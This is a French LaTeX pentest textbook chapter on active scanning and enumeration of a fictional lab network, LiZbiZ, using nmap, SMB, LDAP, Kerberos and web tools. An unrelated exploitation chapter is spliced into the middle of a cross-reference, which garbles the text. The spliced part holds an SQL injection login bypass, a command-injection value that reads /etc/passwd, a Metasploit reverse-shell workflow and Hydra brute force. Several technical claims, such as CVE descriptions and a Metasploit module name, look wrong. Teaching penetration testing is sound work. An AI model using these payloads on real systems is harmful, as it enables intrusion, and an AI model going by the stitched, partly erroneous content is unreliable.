% ==============================================================================
% Fichier     : chapitres/04_scanning_enum.tex
% Titre       : Scanning Actif et Énumération de Services
% Auteur      : MINKA MI NGUIDJOÏ Thierry Emmanuel
% ==============================================================================

\chapter{Scanning Actif et Énumération de Services}
\label{chap:scanning}

La phase de Reconnaissance Passive (Chapitre~\ref{chap:osint}) a fourni une
carte de la surface d'attaque externe sans contact direct avec la cible. Nous
entrons maintenant dans la phase de \termecle{Scanning Actif} : contrairement
à l'\sigle{OSINT}, cette phase \textbf{génère du trafic réseau vers la cible}
et est donc détectable par les systèmes de sécurité (Firewalls, \sigle{IDS}/\sigle{IPS},
\sigle{SIEM}). Elle doit être menée dans la fenêtre temporelle définie par les
\sigle{ROE} (Section~\ref{sec:roe}).

\begin{boxinfo}
\textbf{MITRE ATT\&CK, Tactiques associées :}
Le scanning actif couvre principalement la tactique \sigle{TA0043}
(\textit{Reconnaissance}), avec les techniques T1595
(\textit{Active Scanning}), T1595.001 (\textit{Scanning IP Blocks}),
T1595.002 (\textit{Vulnerability Scanning}) et T1046
(\textit{Network Service Discovery}).
\end{boxinfo}

% ==============================================================================
\section{Objectifs du Scanning}
\label{sec:scanning_objectifs}
% ==============================================================================

Le scanning actif poursuit quatre objectifs complémentaires, chacun alimentant
directement la phase d'exploitation :

\begin{itemize}
    \item \textbf{Discovery :} Quelles machines sont actives et joignables
          sur le réseau cible ?
    \item \textbf{Port Scanning :} Quels ports (services) sont ouverts sur
          ces machines ?
    \item \textbf{Service Detection :} Quelle application et quelle version
          tournent derrière chaque port ouvert ?
    \item \textbf{OS Fingerprinting :} Quel système d'exploitation est utilisé
         , et quelle version précise ?
    \item \textbf{Vulnerability Mapping :} Quelles \sigle{CVE} connues
          s'appliquent aux services et versions détectés ?
\end{itemize}

% ==============================================================================
\section{Découverte d'Hôtes (\textit{Host Discovery})}
\label{sec:host_discovery}
% ==============================================================================

Avant de scanner les ports, il faut identifier les hôtes actifs. Envoyer un
scan de ports complet vers une plage de 254 adresses dont 200 sont éteintes
est une perte de temps considérable.

\subsection{Techniques de Découverte}

Nmap implémente plusieurs méthodes de découverte, chacune adaptée à un
contexte réseau différent.

\begin{table}[htbp]
\centering
\caption{Techniques de découverte d'hôtes Nmap}
\label{tab:host_discovery}
\begin{tabular}{p{3.5cm}p{4.5cm}p{5.5cm}}
\toprule
\textbf{Technique} & \textbf{Mécanisme} & \textbf{Contexte d'usage} \\
\midrule
ICMP Echo (\texttt{-PE})
    & Ping ICMP classique
    & Réseaux sans pare-feu, souvent bloqué en production \\
\addlinespace
ARP Scan (\texttt{-PR})
    & Requêtes ARP de couche 2
    & \sigle{LAN} local uniquement, indétectable par les \sigle{IDS} \\
\addlinespace
TCP SYN Ping (\texttt{-PS})
    & SYN sur port 80/443
    & Contourne les pare-feux filtrant ICMP \\
\addlinespace
TCP ACK Ping (\texttt{-PA})
    & ACK sur port 80
    & Détecte les hôtes derrière un \textit{stateful} firewall \\
\addlinespace
UDP Ping (\texttt{-PU})
    & UDP sur port 40125
    & Détecte les hôtes ne répondant qu'à UDP \\
\bottomrule
\end{tabular}
\end{table}

\begin{lstlisting}[language=bash, caption={Découverte d'hôtes, techniques combinées}]
# Scan ARP sur le LAN (rapide, fiable, indétectable IDS)
nmap -sn -PR 192.168.10.0/24

# Ping scan multi-technique (contourne les pare-feux)
nmap -sn -PS80,443 -PA80 -PE 192.168.10.0/24

# Decouverte rapide avec Masscan (10 000 paquets/seconde)
masscan 192.168.10.0/24 -p80,443,22,445 --rate=1000

# Sauvegarder les hotes actifs pour la suite
nmap -sn 192.168.10.0/24 -oG - | grep "Up" | \
    awk '{print $2}' > hotes_actifs.txt
\end{lstlisting}

\begin{boxinfo}
\textbf{Masscan vs Nmap :} \termecle{Masscan} est conçu pour la vitesse
(scanning de l'Internet complet en minutes) tandis que Nmap privilégie la
précision et les fonctionnalités avancées. En pratique, Masscan identifie
les hôtes actifs et les ports ouverts rapidement, puis Nmap réalise la
détection de service et \sigle{OS} sur les cibles confirmées.
\end{boxinfo}

% ==============================================================================
\section{Scan de Ports}
\label{sec:port_scanning}
% ==============================================================================

\subsection{Mécanismes TCP : Comprendre le 3-\textit{Way Handshake}}
\label{subsec:tcp_mecanique}

Pour saisir pourquoi les différents types de scans ont des propriétés de
furtivité différentes, il est indispensable de comprendre le mécanisme
d'établissement de connexion TCP.

\begin{boxinfo}
\textbf{3-Way Handshake TCP (connexion normale) :}
\begin{enumerate}
    \item Client → Serveur : \textbf{SYN} (demande d'ouverture de connexion)
    \item Serveur → Client : \textbf{SYN/ACK} (port ouvert, serveur prêt)
    \item Client → Serveur : \textbf{ACK} (confirmation, connexion établie)
\end{enumerate}
Si le port est fermé, le serveur répond \textbf{RST/ACK} à l'étape~2.
Si le port est filtré par un pare-feu, \textbf{aucune réponse} (ou ICMP
Port Unreachable).
\end{boxinfo}

\subsection{Types de Scans TCP}
\label{subsec:scan_types}

\begin{table}[htbp]
\centering
\caption{Comparatif des types de scans TCP/UDP}
\label{tab:scan_types}
\begin{tabular}{p{3cm}p{4.5cm}p{5.5cm}}
\toprule
\textbf{Type} & \textbf{Mécanisme} & \textbf{Caractéristiques} \\
\midrule
TCP Connect (\texttt{-sT})
    & Handshake complet (SYN → SYN/ACK → ACK)
    & Bruyant (logs complets), ne nécessite pas root \\
\addlinespace
SYN Scan (\texttt{-sS})
    & SYN → SYN/ACK → \textbf{RST} (connexion interrompue)
    & Furtif (demi-ouvert), rapide, nécessite root/sudo \\
\addlinespace
UDP Scan (\texttt{-sU})
    & Paquet UDP vide → ICMP Port Unreach. si fermé
    & Très lent, indispensable pour DNS (53), SNMP (161) \\
\addlinespace
NULL Scan (\texttt{-sN})
    & Paquet TCP sans flags
    & Contourne certains pare-feux ; invalide sur Windows \\
\addlinespace
FIN Scan (\texttt{-sF})
    & Paquet TCP FIN uniquement
    & Contourne \textit{stateless} firewalls ; invalide sur Windows \\
\addlinespace
XMAS Scan (\texttt{-sX})
    & Flags FIN+PSH+URG simultanés
    & Identique à FIN scan en termes d'évasion \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Les Six États des Ports Nmap}
\label{subsec:port_states}

Nmap classifie les ports en six états distincts, la maîtrise de cette
taxonomie est essentielle pour interpréter correctement les résultats.

\begin{enumerate}
    \item \textbf{Open :} Une application accepte activement les connexions
          sur ce port, cible potentielle d'exploitation.
    \item \textbf{Closed :} Le port est accessible (pas de pare-feu) mais
          aucune application n'écoute, utile pour la détection \sigle{OS}.
    \item \textbf{Filtered :} Nmap ne peut déterminer si le port est ouvert
          car un pare-feu filtre les paquets sans répondre (\textit{drop}).
    \item \textbf{Unfiltered :} Accessible (répond au scan ACK) mais Nmap
          ne peut déterminer s'il est ouvert ou fermé.
    \item \textbf{Open|Filtered :} Nmap ne peut distinguer entre ouvert et
          filtré, typique du scan UDP et des scans furtifs.
    \item \textbf{Closed|Filtered :} Ne peut distinguer entre fermé et filtré
         , produit par le scan IPID Idle.
\end{enumerate}

\subsection{Commandes Nmap Essentielles}
\label{subsec:nmap_commands}

\begin{lstlisting}[language=bash, caption={Scan SYN, ports courants avec timing}]
# Scan SYN furtif sur les 100 ports les plus courants
nmap -sS -T4 --top-ports 100 192.168.10.10

# Scan complet des 65535 ports (plus lent mais exhaustif)
nmap -sS -T4 -p- 192.168.10.10

# Scan UDP sur les ports critiques
nmap -sU -T4 -p 53,67,69,161,123 192.168.10.10

# Templates de timing : T0 (paranoïaque) à T5 (insensé)
# T3 = defaut, T4 = rapide (labs), T2 = furtif (prod)
\end{lstlisting}

\begin{lstlisting}[language=bash, caption={Détection de version et OS, mécanismes}]
# Detection de version de service (-sV)
# Envoie des sondes specifiques a chaque service detecte
# ex: banner grabbing HTTP, interrogation SMTP EHLO, etc.
nmap -sV --version-intensity 5 192.168.10.10

# Detection d'OS (-O), necessite root
# Analyse les caracteristiques TCP/IP : ISN (Initial Sequence Number),
# taille de fenetre (Window Size), valeur TTL, bit DF (Don't Fragment),
# reponse a des paquets invalides (TCP timestamp, IP options)
nmap -O 192.168.10.10

# Scan complet recommande en pentest
nmap -sS -sV -O -sC -T4 --open 192.168.10.0/24 \
     -oA scan_lizbiz
# -sC : scripts par defaut (equivalent --script=default)
# --open : afficher uniquement les ports ouverts
# -oA : sauvegarder en 3 formats (nmap, xml, grepable)
\end{lstlisting}

\begin{boxinfo}
\textbf{Mécanisme d'OS Fingerprinting :} Nmap envoie une série de sondes
TCP/UDP/ICMP soigneusement choisies et analyse les réponses selon sept
critères : \textbf{\sigle{ISN}} (Initial Sequence Number, prévisibilité),
\textbf{Window Size} TCP, \textbf{\sigle{TTL}} initial, \textbf{bit DF}
(\textit{Don't Fragment}), comportement face aux \textit{TCP options} inconnues,
réponse aux paquets invalides, et comportement \sigle{ICMP}. La combinaison
de ces signatures est comparée à une base de plus de 5\,000 empreintes connues.
\end{boxinfo}

% ==============================================================================
\section{Scripts NSE, Nmap Scripting Engine}
\label{sec:nse}
% ==============================================================================

Le \termecle{NSE} (\textit{Nmap Scripting Engine}) permet d'étendre les
capacités de Nmap avec des scripts Lua. Il dispose de plus de 600 scripts
organisés en catégories.

\begin{table}[htbp]
\centering
\caption{Catégories NSE et usages en pentest}
\label{tab:nse_categories}
\begin{tabular}{p{2.5cm}p{4cm}p{6.5cm}}
\toprule
\textbf{Catégorie} & \textbf{Activation} & \textbf{Usage} \\
\midrule
\texttt{default}
    & \texttt{-sC}
    & Scripts sûrs, informatifs, banner grabbing, détection de protocoles \\
\addlinespace
\texttt{vuln}
    & \texttt{--script=vuln}
    & Détection de vulnérabilités connues (EternalBlue, Shellshock, Heartbleed) \\
\addlinespace
\texttt{auth}
    & \texttt{--script=auth}
    & Test de credentials par défaut sur les services \\
\addlinespace
\texttt{brute}
    & \texttt{--script=brute}
    & Attaques par dictionnaire sur SSH, FTP, HTTP-auth, LDAP \\
\addlinespace
\texttt{discovery}
    & \texttt{--script=discovery}
    & Énumération approfondie : partages SMB, DNS, SNMP \\
\addlinespace
\texttt{exploit}
    & \texttt{--script=exploit}
    & Exploitation directe (usage avec précaution en pentest) \\
\bottomrule
\end{tabular}
\end{table}

\begin{lstlisting}[language=bash, caption={Utilisation avancée des scripts NSE}]
# Scripts par defaut (recommande pour tout scan)
nmap -sC -sV 192.168.10.10

# Detection de vulnerabilites connues
nmap --script=vuln -p80,443,445,22 192.168.10.10
# Detecte : ms17-010 (EternalBlue), http-shellshock,
#           ssl-heartbleed, http-sql-injection, etc.

# Scripts SMB specifiques
nmap --script=smb-vuln-ms17-010 -p445 192.168.10.10
nmap --script=smb-enum-shares,smb-enum-users -p445 192.168.10.10
nmap --script=smb-security-mode -p445 192.168.10.10

# Scripts HTTP
nmap --script=http-title,http-server-header,http-methods \
     -p80,443,8080 192.168.10.10

# LDAP enumeration (port 389/636)
nmap --script=ldap-search,ldap-rootdse -p389 192.168.10.5
\end{lstlisting}

% ==============================================================================
\section{Énumération de Services}
\label{sec:service_enum}
% ==============================================================================

Une fois les ports ouverts et les versions identifiées, l'énumération approfondie
extrait des informations exploitables : utilisateurs, configurations, partages,
politiques d'authentification.

\subsection{Énumération Web (Ports 80/443/8080)}
\label{subsec:web_enum}

L'énumération web vise à cartographier la surface d'application : répertoires
cachés, fichiers de configuration exposés, technologies utilisées, points d'entrée
de l'application.

\begin{lstlisting}[language=bash, caption={Énumération web, outils complémentaires}]
# Dirb, énumeration par dictionnaire (classique)
dirb http://lizbiz.local /usr/share/wordlists/dirb/common.txt

# Gobuster, plus rapide, multi-threadé, meilleur wordlist support
gobuster dir -u http://lizbiz.local \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,html,txt,bak,old,conf \
    -t 50 --no-error

# Feroxbuster, recursif, détecte les sous-répertoires automatiquement
feroxbuster -u http://lizbiz.local \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
    -x php,html,txt -r --depth 3

# Nikto, scanner de vulnérabilités web (configurations dangereuses,
#         fichiers sensibles, versions obsolètes, méthodes HTTP non
#         sécurisées, headers manquants)
nikto -h http://lizbiz.local -o nikto_lizbiz.html -Format htm
\end{lstlisting}

\begin{boxinfo}
\textbf{SecLists :} La collection \termecle{SecLists} (Daniel Miessler)
est la référence pour les wordlists de pentest. Elle inclut des listes
spécialisées par technologie (WordPress, Drupal, IIS, Tomcat) et par type
(répertoires, fichiers, paramètres, sous-domaines). Installation :
\texttt{apt install seclists} ou \texttt{git clone
https://github.com/danielmiessler/SecLists}.
\end{boxinfo}

\begin{boxlizbiz}
\textbf{Découverte Web LiZbiZ :}
\begin{lstlisting}[language=bash]
gobuster dir -u http://203.0.113.10 \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,txt,bak -t 50
\end{lstlisting}
\textbf{Résultats :}
\begin{itemize}
    \item \texttt{/backup/}, répertoire accessible en lecture (200)
    \item \texttt{/backup/old\_passwd.txt}, identifiants obsolètes
    \item \texttt{/admin/}, page de connexion administrative (200)
    \item \texttt{/config.php.bak}, sauvegarde de fichier de configuration (200)
\end{itemize}
\end{boxlizbiz}

\subsection{Énumération SMB (Ports 139/445)}
\label{subsec:smb_enum}

Le protocole \sigle{SMB} (\textit{Server Message Block}) est historiquement
l'un des services les plus riches en informations pour un attaquant interne.

\begin{lstlisting}[language=bash, caption={Énumération SMB complète}]
# Scripts NSE SMB
nmap --script=smb-enum-shares,smb-enum-users,smb-security-mode \
     -p445 192.168.10.20

# CrackMapExec, enumeration SMB en une commande
crackmapexec smb 192.168.10.0/24

# Enum4Linux-ng, outil dédié, agrège SMB + RPC + LDAP
enum4linux-ng -A 192.168.10.20

# Smbclient, navigation interactive dans les partages
smbclient -L //192.168.10.20 -N        # Lister les partages (null session)
smbclient //192.168.10.20/SYSVOL -N   # Acceder au partage SYSVOL

# Vérification de la vulnérabilité EternalBlue (MS17-010)
nmap --script=smb-vuln-ms17-010 -p445 192.168.10.20
\end{lstlisting}

\begin{boxalert}
\textbf{Null Session SMB :} Une connexion anonyme (\textit{null session})
sans identifiants vers un service SMB peut révéler la liste des utilisateurs,
les partages, les politiques de mots de passe et les groupes, sans aucune
authentification. Cette configuration, courante sur les systèmes anciens
(Windows Server 2003/XP), est mappée MITRE T1135
(\textit{Network Share Discovery}).
\end{boxalert}

\subsection{Énumération LDAP et Active Directory (Ports 389/636/3268)}
\label{subsec:ldap_enum}

L'énumération \sigle{LDAP} est critique dans les environnements Windows
Active Directory. Elle permet de cartographier les utilisateurs, groupes,
politiques et relations de confiance avant même d'exploiter la moindre
vulnérabilité.

\begin{lstlisting}[language=bash, caption={Énumération LDAP et Active Directory}]
# Requete LDAP anonyme (RootDSE, souvent accessible sans auth)
ldapsearch -H ldap://192.168.10.5 -x -s base namingcontexts

# Enumeration des utilisateurs (avec compte stagiaire)
ldapsearch -H ldap://192.168.10.5 \
    -x -D "stagiaire@lizbiz.local" -w "Password123" \
    -b "DC=lizbiz,DC=local" \
    "(objectClass=user)" sAMAccountName mail memberOf

# Enumeration des groupes privilegies
ldapsearch -H ldap://192.168.10.5 \
    -x -D "stagiaire@lizbiz.local" -w "Password123" \
    -b "DC=lizbiz,DC=local" \
    "(cn=Domain Admins)" member

# BloodHound, collecte complete de la topologie AD
# (sera detaille au Chapitre suivant)
bloodhound-python -u stagiaire -p Password123 \
    -d lizbiz.local -ns 192.168.10.5 -c all
\end{lstlisting}

\begin{boxlizbiz}
\textbf{Découverte LDAP LiZbiZ :}
Avec le compte \og{}stagiaire\fg{} fourni dans les \sigle{ROE}, l'énumération
\sigle{LDAP} révèle :
\begin{itemize}
    \item \textbf{47 utilisateurs} dont 3 comptes de service avec
          \sigle{SPN} configurés (cibles Kerberoasting).
    \item \textbf{Compte admin-it}, membre du groupe
          \og{}Domain Admins\fg{}.
    \item \textbf{Politique de mots de passe :} longueur minimale 8 chars,
          pas de verrouillage après échecs (brute force possible).
\end{itemize}
\end{boxlizbiz}

\subsection{Énumération Kerberos (Port 88)}
\label{subsec:kerb_enum}

Le service Kerberos expose des informations exploitables avant toute
authentification.

\begin{lstlisting}[language=bash, caption={Énumération Kerberos}]
# Kerbrute, enumeration des utilisateurs valides (sans authentification)
# Exploite le comportement du KDC : erreur différente pour compte inexistant
# vs mauvais mot de passe (T1589.001 dans MITRE)
kerbrute userenum -d lizbiz.local \
    /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
    --dc 192.168.10.5

# AS-REP Roasting, comptes sans pre-authentification Kerberos requise
# (GetNPUsers.py de la suite Impacket)
GetNPUsers.py lizbiz.local/ -usersfile users.txt \
    -no-pass -dc-ip 192.168.10.5
# Produit un hash AS-REP crackable hors-ligne avec hashcat
\end{lstlisting}

\subsection{Énumération SMTP (Port 25)}
\label{subsec:smtp_enum}

Les serveurs mail révèlent souvent des informations sur les comptes internes
via les commandes \sigle{SMTP} \texttt{VRFY} et \texttt{EXPN}.

\begin{lstlisting}[language=bash, caption={Énumération de comptes via SMTP}]
# Connexion manuelle
nc 192.168.10.50 25
# Puis : EHLO test
#        VRFY admin        → 250 OK si le compte existe
#        VRFY nonexistent  → 550 si inexistant

# Enumeration automatisée
smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/\
    top-usernames-shortlist.txt -t 192.168.10.50

# Nmap NSE
nmap --script=smtp-commands,smtp-enum-users -p25 192.168.10.50
\end{lstlisting}

\subsection{Énumération DNS (Port 53)}
\label{subsec:dns_active}

Le transfert de zone \sigle{AXFR} a été abordé en phase passive. En phase
active, d'autres techniques complètent la cartographie DNS.

\begin{lstlisting}[language=bash, caption={Énumération DNS active}]
# Tentative de transfert de zone
dig axfr @192.168.10.5 lizbiz.local

# Brute force de sous-domaines (dnsx)
dnsx -d lizbiz.local \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Reverse lookup sur la plage interne
for ip in $(seq 1 20); do
    dig -x 192.168.10.$ip +short @192.168.10.5
done
\end{lstlisting}

% ==============================================================================
\section{Scan de Vulnérabilités Automatisé}
\label{sec:vuln_scan}
% ==============================================================================

Une fois les services cartographiés, les scanners de vulnérabilités croisent
les versions détectées avec les bases de données de failles connues (\sigle{CVE},
\sigle{NVD}, \sigle{ExploitDB}).

\subsection{Nessus et OpenVAS}
\label{subsec:nessus}

Ces scanners actifs envoient des sondes spécifiques pour détecter si un
service est vulnérable à une \sigle{CVE} précise, sans nécessairement
l'exploiter.

\begin{boxlizbiz}
\textbf{Résultat Nessus, LiZbiZ :}
Le scan signale :
\begin{itemize}
    \item \textbf{Critique (CVSS 9.8)} : Serveur web 203.0.113.10 —
          Apache~2.2.22 vulnérable à CVE-2012-0053 (\textit{httpOnly} cookie
          disclosure) et CVE-2012-0031 (RCE via \texttt{mod\_setenvif}).
    \item \textbf{Critique (CVSS 9.8)} : Port 445 (192.168.10.20) —
          MS17-010 EternalBlue détecté.
    \item \textbf{Élevé (CVSS 7.5)} : LDAP anonymous bind autorisé sur
          192.168.10.5.
\end{itemize}
Ces trois vecteurs seront exploités au Chapitre~\ref{chap:% ==============================================================================
% Fichier : 05_exploitation.tex
% Description : Vulnérabilités et Exploitation
% ==============================================================================

\chapter{Vulnérabilités et Exploitation}

Une fois la surface d'attaque cartographiée (Scanning), vient la phase d'\textbf{Exploitation}. L'objectif est de prouver qu'une vulnérabilité identifiée a un impact réel en réussissant à exécuter du code ou à extraire des données sur la cible.

\section{Concepts Fondamentaux de l'Exploitation}
% ------------------------------------------------------------------------------

\subsection{Le Trio de l'Attaque}

\begin{itemize}
    \item \textbf{Vulnérabilité :} La faille technique (ex: code mal écrit, configuration faible).
    \item \textbf{Exploit :} Le code ou la méthode utilisée pour abuser de la vulnérabilité.
    \item \textbf{Payload :} Le "fardeau" transporté par l'exploit pour exécuter une action sur la cible (ex: ouvrir un shell, créer un utilisateur).
\end{itemize}

\subsection{Types de Shells}

L'objectif ultime de l'exploitation est souvent d'obtenir un accès à distance (Shell).

\begin{table}[h!]
\centering
\begin{tabular}{p{3cm}p{5cm}p{4cm}}
    \toprule
    \textbf{Type} & \textbf{Fonctionnement} & \textbf{Usage} \\
    \midrule
    \textbf{Reverse Shell} & La cible se connecte à l'attaquant (Outbound). & Contourne les pare-feux (les connexions sortantes sont souvent autorisées). \\
    \textbf{Bind Shell} & La cible écoute sur un port, l'attaquant s'y connecte (Inbound). & Utile si aucun pare-feu ne bloque l'entrée. \\
    \textbf{Web Shell} & Script déposé sur le serveur web (ex: PHP). & Persistant, facile à utiliser via un navigateur. \\
    \bottomrule
\end{tabular}
\caption{Types de shells}
\end{table}

% ------------------------------------------------------------------------------
\section{Exploitation Web (OWASP Top 10)}
% ------------------------------------------------------------------------------

Les applications web sont souvent la porte d'entrée la plus facile.

\subsection{Injection SQL (SQLi)}

\begin{boxdef}
\textbf{SQLi :} Technique consistant à injecter du code SQL malveillant dans les entrées de l'application pour manipuler la base de données.
\end{boxdef}

\textbf{Types de SQLi :}
\begin{itemize}
    \item \textbf{In-Band (Classique) :} L'attaquant voit les résultats directement sur la page (Error based, Union based).
    \item \textbf{Blind (Aveugle) :} L'attaquant ne voit pas les données mais peut déduire la réponse via le comportement de la page (Boolean based, Time based).
\end{itemize}

\begin{boxlizbiz}
\textbf{Attaque LiZbiZ :}
Sur la page de connexion de LiZbiZ, le champ "Nom d'utilisateur" est vulnérable.
\begin{lstlisting}[language=SQL]
Payload : ' OR '1'='1' --
Resultat : La requete devient toujours vraie, connectant l'attaquant en tant qu'admin sans mot de passe.
\end{lstlisting}
Utilisation de \textbf{SQLMap} pour automatiser l'extraction de toute la base de données clients :
\begin{lstlisting}[language=bash]
sqlmap -u "http://lizbiz.local/login?id=1" --dump
\end{lstlisting}
\end{boxlizbiz}

\subsection{File Inclusion (LFI/RFI)}

\begin{itemize}
    \item \textbf{LFI (Local File Inclusion) :} Inclure des fichiers présents sur le serveur (ex: \texttt{/etc/passwd}) via un paramètre non filtré.
    \item \textbf{RFI (Remote File Inclusion) :} Inclure un fichier distant (ex: une backdoor PHP hébergée sur le serveur de l'attaquant).
\end{itemize}

\subsection{Command Injection}

Exécution de commandes système via une entrée utilisateur non nettoyée (ex: ping d'une IP).

\begin{lstlisting}[language=bash, caption=Injection de commande]
Entree : 127.0.0.1 ; cat /etc/passwd
Le serveur execute : ping 127.0.0.1 ; cat /etc/passwd
\end{lstlisting}

% ------------------------------------------------------------------------------
\section{Exploitation Système et Réseau}
% ------------------------------------------------------------------------------

\subsection{Le Framework Metasploit}

C'est l'outil standard pour l'exploitation de vulnérabilités réseaux et systèmes. Il centralise les exploits, les payloads et les encodeurs.

\begin{lstlisting}[language=bash, caption=Workflow Metasploit]
msfconsole
# 1. Chercher un exploit
search apache 2.2.22
# 2. Utiliser l'exploit
use exploit/multi/http/apache_mod_jpeg_overflow
# 3. Configurer la cible
set RHOSTS 192.168.1.10
set PAYLOAD php/meterpreter/reverse_tcp
# 4. Lancer l'attaque
exploit
\end{lstlisting}

\subsection{Exploitation de Services Connus}

\begin{itemize}
    \item \textbf{SSH (Port 22) :} Souvent protégé par mot de passe faible. Utilisation de \texttt{Hydra} pour le Brute Force.
    \begin{lstlisting}[language=bash]
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
    \end{lstlisting}
    \item \textbf{SMB (Port 445) :} Cible privilégiée. Exploitation de failles comme \textbf{EternalBlue (MS17-010)} ou \textbf{BlueKeep}.
\end{itemize}

\begin{boxlizbiz}
\textbf{Scénario LiZbiZ :}
Le scan a révélé un serveur Windows Server 2012 R2 non mis à jour (Port 445 ouvert).
L'attaquant utilise le module Metasploit \texttt{exploit/windows/smb/ms17\_010\_eternalblue}.
\textbf{Résultat :} Un shell "SYSTEM" (Administrateur maximum) est ouvert sur le serveur, donnant le contrôle total de la machine.
\end{boxlizbiz}

% ------------------------------------------------------------------------------
\section{Transfert de Fichiers (Post-Exploitation)}
% ------------------------------------------------------------------------------

Une fois un accès obtenu, il faut souvent uploader des outils (Mimikatz, scripts) sur la cible.

\begin{itemize}
    \item \textbf{Serveur HTTP simple :} \texttt{python3 -m http.server 8080} sur la machine attaquante, puis \texttt{wget} ou \texttt{certutil} sur la cible.
    \item \textbf{Netcat :} Transfert direct via socket.
\end{itemize}
}.
\end{boxlizbiz}

\subsection{Nuclei, Scanner de Templates}
\label{subsec:nuclei}

\termecle{Nuclei} (ProjectDiscovery) est un scanner de vulnérabilités moderne
basé sur des templates \sigle{YAML} communautaires. Il est plus léger et plus
personnalisable que Nessus pour les tests ciblés.

\begin{lstlisting}[language=bash, caption={Scan Nuclei ciblé}]
# Mise a jour des templates
nuclei -update-templates

# Scan sur une cible avec templates CVE
nuclei -u http://203.0.113.10 -t cves/ -severity critical,high

# Scan sur les templates de mauvaise configuration
nuclei -u http://203.0.113.10 -t misconfigurations/ -t exposures/

# Scan reseau complet
nuclei -l hotes_actifs.txt -t network/ -t cves/ -o nuclei_lizbiz.txt
\end{lstlisting}

% ==============================================================================
\section{Synthèse : Tableau de Bord Scanning LiZbiZ}
\label{sec:synthese_scanning}
% ==============================================================================

\begin{table}[htbp]
\centering
\caption{Synthèse du scanning, résultats LiZbiZ et vecteurs d'exploitation}
\label{tab:synthese_scanning}
\begin{tabular}{p{2.8cm}p{2.5cm}p{3cm}p{5cm}}
\toprule
\textbf{Cible} & \textbf{Port / Service} & \textbf{Version} & \textbf{Vecteur d'exploitation} \\
\midrule
203.0.113.10
    & 80/HTTP
    & Apache 2.2.22
    & CVE-2012-0031 (RCE) → Chap.~\ref{chap:exploit} \\
\addlinespace
203.0.113.10
    & 80/HTTP
    & PHP application
    & Injection SQL (login) → Chap.~\ref{chap:exploit} \\
\addlinespace
192.168.10.50
    & 80/HTTP
    & Intranet LiZbiZ
    & \texttt{/backup/old\_passwd.txt} → brute force \\
\addlinespace
192.168.10.20
    & 445/SMB
    & Windows Server 2012 R2
    & MS17-010 EternalBlue → Chap.~\ref{chap:exploit} \\
\addlinespace
192.168.10.5
    & 389/LDAP
    & Active Directory
    & Anonymous bind + 3 SPN (Kerberoasting) \\
\addlinespace
192.168.10.5
    & 88/Kerberos
    & Windows Server 2019
    & AS-REP Roasting (comptes sans pré-auth) \\
\addlinespace
192.168.10.50
    & 25/SMTP
    & Postfix 3.x
    & VRFY user enumeration → liste comptes \\
\bottomrule
\end{tabular}
\end{table}

\begin{boxlizbiz}
\textbf{Bilan du scanning LiZbiZ :}

La phase de scanning actif a transformé la carte de surface d'attaque
construite en \sigle{OSINT} en un inventaire précis de vecteurs exploitables :
\begin{enumerate}
    \item \textbf{Entrée externe} : Apache~2.2.22 (CVE) + injection SQL
          sur le formulaire de connexion → accès au serveur \sigle{DMZ}.
    \item \textbf{Mouvement latéral} : EternalBlue sur le serveur Windows
          interne → shell \sigle{SYSTEM}.
    \item \textbf{Accès à l'AD} : LDAP anonymous bind → cartographie
          complète + 3 comptes \sigle{SPN} pour Kerberoasting.
\end{enumerate}
Ces trois vecteurs constituent le scénario d'attaque du
Chapitre~\ref{chap:exploit}.
\end{boxlizbiz}

% ==============================================================================
\section*{Points Clés à Retenir}
% ==============================================================================

\begin{boxinfo}
\textbf{Ce qu'il faut retenir de ce chapitre :}
\begin{enumerate}
    \item Le scanning \textbf{génère du trafic} vers la cible et doit être
          mené dans les plages horaires des \sigle{ROE}.
    \item Le \textbf{SYN Scan} (\texttt{-sS}) est le standard : furtif,
          rapide, nécessite root.
    \item \textbf{Nmap} détecte l'\sigle{OS} via 7 critères TCP/IP
          (ISN, Window Size, TTL, DF bit…), pas par magie.
    \item Les \textbf{scripts NSE} (\texttt{-sC}, \texttt{--script=vuln})
          démultiplient la valeur d'un scan Nmap sans effort supplémentaire.
    \item L'énumération \textbf{LDAP/AD} avec un compte standard révèle
          une quantité massive d'informations exploitables.
    \item \textbf{Masscan} pour la vitesse, \textbf{Nmap} pour la précision :
          les deux sont complémentaires.
    \item Tout résultat de scan doit être \textbf{sauvegardé} (\texttt{-oA})
          avec hash SHA-256 pour la chaîne de custody.
\end{enumerate}
\end{boxinfo}

% ==============================================================================
\section*{Exercices Pratiques}
% ==============================================================================

\begin{boxexo}
\textbf{Exercice 4.1, Scan complet du lab LiZbiZ}

\medskip
\textbf{Prérequis :} Lab déployé (Exercice~1.1), Kali Linux opérationnelle.

\medskip
\textbf{Tâches :}
\begin{enumerate}
    \item Lancer une découverte d'hôtes sur \texttt{192.168.10.0/24} et
          \texttt{203.0.113.0/24}.
    \item Effectuer un scan \sigle{SYN} complet (\texttt{-p-}) sur les
          hôtes découverts, avec détection de version et scripts par défaut.
    \item Identifier manuellement les services Apache, SMB, LDAP et SMTP.
    \item Lancer \texttt{nikto} sur le serveur web et analyser le rapport.
    \item Lancer \texttt{enum4linux-ng -A} sur le serveur Windows et
          identifier les partages accessibles.
    \item Sauvegarder tous les résultats en format \texttt{-oA} et calculer
          leurs hashes SHA-256.
\end{enumerate}

\medskip
\textbf{Livrable :} Tableau des ports ouverts + versions + CVE associées
(format du Tableau~\ref{tab:synthese_scanning}).
\end{boxexo}

\begin{boxexo}
\textbf{Exercice 4.2, Énumération Active Directory avec le compte stagiaire}

\medskip
\textbf{Prérequis :} Compte \texttt{stagiaire / Password123} fourni dans
les ROE.

\medskip
\textbf{Tâches :}
\begin{enumerate}
    \item Effectuer une requête \sigle{LDAP} pour lister tous les utilisateurs
          du domaine \texttt{lizbiz.local}.
    \item Identifier les comptes de service avec \sigle{SPN} configuré
          (cibles Kerberoasting, sera exploité au
          Chapitre~\ref{chap:postexploit}).
    \item Utiliser \texttt{kerbrute} pour valider la liste d'utilisateurs
          collectée en \sigle{OSINT}.
    \item Lancer BloodHound-python en collecte \texttt{-c all} et importer
          le résultat dans BloodHound.
